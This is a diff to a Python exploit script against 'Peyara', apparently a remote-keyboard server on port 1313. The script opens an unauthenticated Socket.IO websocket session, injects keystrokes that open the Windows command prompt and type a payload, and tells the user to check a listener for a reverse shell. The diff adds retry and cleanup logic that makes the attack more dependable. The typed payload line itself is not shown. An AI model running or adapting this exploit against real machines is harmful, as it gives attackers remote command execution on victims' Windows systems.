@@ -67,31 +67,47 @@ async def type_string(ws, text):
         await send_key(ws, ch)
 
 
+async def open_session(uri, retries=12, delay=4):
+    # Peyara serves a single Socket.IO session at a time and keeps a dropped one
+    # alive until its ping timeout, so a fresh connect can briefly fail to get the
+    # OPEN frame. Retry until the previous session is released.
+    for attempt in range(1, retries + 1):
+        ws = None
+        try:
+            ws = await websockets.connect(uri, open_timeout=8)
+            open_frame = await asyncio.wait_for(ws.recv(), 8)
+            if open_frame.startswith("0"):
+                await ws.send("40")
+                for _ in range(5):
+                    frame = await asyncio.wait_for(ws.recv(), 8)
+                    if frame == "2":
+                        await ws.send("3")
+                    if frame.startswith("40"):
+                        print(f"[<] OPEN + CONNECT (attempt {attempt})")
+                        return ws
+            # not ready: close this attempt cleanly and retry
+            await ws.send("1")
+            await ws.close()
+        except Exception as e:
+            if ws:
+                try:
+                    await ws.close()
+                except Exception:
+                    pass
+            print(f"[!] attempt {attempt} error: {e}")
+        print(f"[*] target busy, retrying ({attempt}/{retries})...")
+        await asyncio.sleep(delay)
+    return None
+
+
 async def main(target, lhost, lport):
     uri = f"ws://{target}:1313/socket.io/?EIO=4&transport=websocket"
-    async with websockets.connect(uri) as ws:
-        # Engine.IO OPEN
-        open_frame = await ws.recv()
-        if not open_frame.startswith("0"):
-            print("[-] No Engine.IO OPEN frame:", open_frame)
-            return
-        print("[<] OPEN")
+    ws = await open_session(uri)
+    if ws is None:
+        print("[-] Could not establish a Socket.IO session (target busy or not vulnerable)")
+        return
 
-        # Socket.IO namespace CONNECT (send 40, wait for 40 ack, answer pings)
-        await ws.send("40")
-        connected = False
-        for _ in range(5):
-            frame = await ws.recv()
-            if frame == "2":
-                await ws.send("3")
-            if frame.startswith("40"):
-                connected = True
-                break
-        if not connected:
-            print("[-] No Socket.IO CONNECT ack")
-            return
-        print("[<] CONNECT")
-
+    try:
         await asyncio.sleep(1)
 
         # Open the Windows command prompt: Ctrl+Esc -> type "cmd" -> Enter
@@ -111,9 +127,13 @@ async def main(target, lhost, lport):
         await asyncio.sleep(1)
         await send_key(ws, "enter")
         print("[+] Payload sent - check your listener for the shell")
-
+    finally:
         # Close the Engine.IO session so the server releases it immediately
-        await ws.send("1")
+        try:
+            await ws.send("1")
+            await ws.close()
+        except Exception:
+            pass
 
 
 if __name__ == "__main__":
